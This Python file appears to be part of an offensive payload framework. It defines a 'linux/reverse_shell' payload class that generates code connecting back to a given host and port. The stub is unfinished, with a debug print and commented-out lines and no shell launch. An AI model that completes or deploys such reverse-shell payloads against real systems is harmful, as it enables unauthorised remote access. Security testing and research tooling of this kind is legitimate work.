from dataclasses import dataclass

from int3.emission import LinuxEmitter
from int3.registers import Registers

from .payload import Payload


@dataclass
class LinuxReverseShell(Payload[Registers]):
    host: str
    port: int

    @classmethod
    def name(cls) -> str:
        return "linux/reverse_shell"

    def compile(self) -> str:
        emitter = LinuxEmitter[Registers].get_emitter(self.ctx.architecture, self.ctx)

        fd_reg = emitter.net_open_connection(ip_addr=self.host, port=self.port)

        # XXX
        print(f"{fd_reg = }")

        # emitter.jne(fd_reg, 0, label="else")
        # emitter.label("else")

        # emitter.echo(self.host.encode())

        return str(emitter)
